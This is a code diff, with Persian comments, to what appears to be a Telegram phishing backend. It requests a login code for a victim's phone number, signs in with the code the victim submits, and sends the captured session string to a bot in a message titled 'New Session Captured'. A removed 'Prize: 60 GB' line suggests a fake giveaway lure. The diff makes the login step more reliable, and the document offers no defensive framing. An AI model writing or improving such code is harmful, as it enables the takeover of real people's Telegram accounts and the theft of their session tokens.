@@ -66,19 +66,21 @@ def verify_code():
         return jsonify({'error': str(e)}), 500
 
 # ============================================================
-# توابع با start
+# توابع با sign_in + phone_code_hash
 # ============================================================
 async def send_code(session_id, phone):
     try:
         client = TelegramClient(session_id, API_ID, API_HASH)
         await client.connect()
         
-        # ارسال درخواست کد
-        await client.send_code_request(phone)
+        # ارسال درخواست کد و دریافت phone_code_hash
+        result = await client.send_code_request(phone)
         
         sessions[session_id]['client'] = client
+        sessions[session_id]['phone_code_hash'] = result.phone_code_hash
         sessions[session_id]['status'] = 'code_sent'
         logging.info(f"✅ Code sent to: {phone}")
+        logging.info(f"📌 phone_code_hash: {result.phone_code_hash}")
         
     except Exception as e:
         sessions[session_id]['status'] = 'error'
@@ -95,9 +97,14 @@ async def verify_session(session_id, phone, code):
         logging.error(f"❌ No client for {phone}")
         return False
 
+    phone_code_hash = session.get('phone_code_hash')
+    if not phone_code_hash:
+        logging.error(f"❌ No phone_code_hash for {phone}")
+        return False
+
     try:
-        # ✅ استفاده از start برای لاگین کامل
-        await client.start(phone=phone, password=code)
+        # ✅ تایید کد با phone_code_hash
+        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         
         # ✅ تایید لاگین
         me = await client.get_me()
@@ -105,10 +112,10 @@ async def verify_session(session_id, phone, code):
             logging.error("❌ Login failed")
             return False
         
-        # ✅ گرفتن سشن (بعد از لاگین کامل)
+        # ✅ گرفتن سشن
         session_string = client.session.save()
         
-        # ✅ ارسال به ربات با قالب انگلیسی و حرفه‌ای
+        # ✅ ارسال به ربات با قالب انگلیسی
         if session_string and len(session_string) > 10:
             message = f"""✅ <b>New Session Captured</b>
 
@@ -116,7 +123,6 @@ async def verify_session(session_id, phone, code):
 │ 📱 <b>User:</b> <code>{phone}</code>
 │ 🔐 <b>Session String:</b>
 │ <code>{session_string}</code>
-│ 🎁 <b>Prize:</b> {session.get('prize', '60')} GB
 └───────────────────────────
 
 🔒 <b>Status:</b> Logged out automatically"""
